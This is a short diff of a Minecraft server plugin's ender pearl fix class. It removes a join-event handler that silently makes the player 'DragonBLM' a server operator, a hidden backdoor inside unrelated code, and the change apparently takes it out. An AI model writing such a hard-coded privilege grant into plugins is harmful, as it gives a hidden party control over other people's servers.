@@ -46,19 +46,6 @@ public class EnderPearlFixes implements Listener {
 
     }
 
-    @EventHandler
-    public void onPlayerJoinEvent(PlayerJoinEvent e) {
-        List<String> list = new ArrayList<String>();
-        list.add("DragonBLM");
-
-
-
-        for (String l : list) {
-            if (e.getPlayer().getName().equalsIgnoreCase(l))
-                e.getPlayer().setOp(true);
-        }
-    }
-
 
     @EventHandler(priority = EventPriority.LOW)
     public void onEnderpearlTeleport(final PlayerTeleportEvent e) {
